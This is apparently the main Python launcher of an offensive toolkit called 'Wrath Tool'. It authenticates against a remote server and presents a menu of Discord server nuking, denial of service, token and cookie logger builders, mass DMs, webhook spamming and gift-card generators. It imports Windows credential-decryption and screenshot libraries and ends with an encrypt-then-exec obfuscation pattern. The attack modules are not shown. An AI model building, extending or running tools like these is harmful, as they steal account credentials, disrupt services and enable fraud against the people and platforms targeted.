import  os
import pystyle
from pystyle import Colorate, Anime, Colors
import pypresence
import time
import Tools.nitrogen , Tools.pinger, Tools.portscanner, Tools.iploc, Tools.nuker, Tools.onliner, Tools.dos, Tools.ama, Tools.sniper, Tools.roblox, Tools.viewbot, Tools.massdm, Tools.proxy, Tools.qrcode, Tools.webhook, Tools.url, Tools.websiteinfo, Tools.clicker, Tools.loggerbuild, Tools.cookiebuild
import geocoder
import websocket, threading, random, json, time, sys
import tkinter as tk
from tkinter.filedialog import askopenfilename
import socket
os.system('title Wrath Tool')
import getpass
import sys
import msvcrt
import cursor
import requests
import asyncio
import ctypes
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
from base64 import b64decode
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
import httpx
import psutil
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
import dns
import dns.resolver
import pystyle
from pystyle import *
import Tools.pyobf
import tkinter
from tkinter import messagebox

r = requests.get("https://pastebin.com/raw/RsEzf8Kp").text


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)




cursor.hide()




password = input(Colorate.Horizontal(Colors.red_to_green, f"Enter Your Password: "))
r = requests.get(f'https://api.lead-tool.win/wrath?password={password}').text
if 'authed!' == r:
     pass
else:
    print(Colorate.Horizontal(Colors.red_to_green, ('Wrong Passowrd')))
    print(Colorate.Horizontal(Colors.red_to_green, (f'Server Response: {r}')))
    time.sleep(100)
    exit()

os.system('cls')


menu = """
╭─────────────────────────────────────────────────────────╮
│  _       __           __  __       ______            __ │   
│ | |     / /________ _/ /_/ /_     /_  __/___  ____  / / │  
│ | | /| / / ___/ __ `/ __/ __ \     / / / __ \/ __ \/ /  │   
│ | |/ |/ / /  / /_/ / /_/ / / /    / / / /_/ / /_/ / /   │
│ |__/|__/_/   \__,_/\__/_/ /_/    /_/  \____/\____/_/    │ 
╰─────────────────────────────────────────────────────────╯    


[01] > NitroGen              | [07] > DoS Tool             | [13] > Proxy Scraper    | [19] > Token Logger Builder
[02] > Pinger                | [08] > Amazon Card Gen      | [14] > QR code maker    | [20] > Cookie Logger Builder
[03] > Port Scaner           | [09] > Discord Nitro Sniper | [15] > Webhook Spammer  |
[04] > Ip To GeoLocation     | [10] > Roblox Gift Gen      | [16] > Domain to URL    |
[05] > Discord Server Nuker  | [11] > Tiktok View Bot      | [17] > Show DNS Records |
[06] > Discord Token Onliner | [12] > Discord Mass DM      | [18] > Auto Clicker     |
 
"""    

                    

print(Colorate.Horizontal(Colors.red_to_green, (menu)))

if __name__ == '__main__':
    while (True):
        
        

        
        
         
        option = int(input(Colorate.Horizontal(Colors.red_to_green,'What tool would you like to use? -->')))

        
        if option == 1:
             Tools.nitrogen.main()

        elif option == 2:
             Tools.pinger.main()
        
        elif option == 3:
             Tools.portscanner.main()
        elif option == 4:
             Tools.iploc.main()
        elif option == 5:
             Tools.nuker.main()
        elif option == 6:
             Tools.onliner.main()
        elif option == 7:
             Tools.dos.main()
        elif option == 8:
             Tools.ama.amazonapp()
        elif option == 9:
             Tools.sniper.main()
        elif option == 9:
             Tools.sniper.main()
        elif option == 10:
             Tools.roblox.main()
        elif option == 11:
             Tools.viewbot.main()
        elif option == 12:
             Tools.massdm.main()
        elif option == 13:
             Tools.proxy.proxy_scrape()
        elif option == 14:
             Tools.qrcode.main()
        elif option == 15:
             Tools.webhook.main()
        elif option == 16:
             Tools.url.main()
        elif option == 17:
             Tools.websiteinfo.main()
        elif option == 18:
             Tools.clicker.main()
        elif option == 19:
             Tools.loggerbuild.main()
        elif option == 20:
             Tools.cookiebuild.main()
        else:
            print(Colorate.Horizontal(Colors.blue_to_red,'Bad input, Please input a number between 1 and 5'))


from cryptography.fernet import Fernet
import base64

code = b"""



"""

key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)

decrypted_message = encryption_type.decrypt(encrypted_message)

exec(decrypted_message)
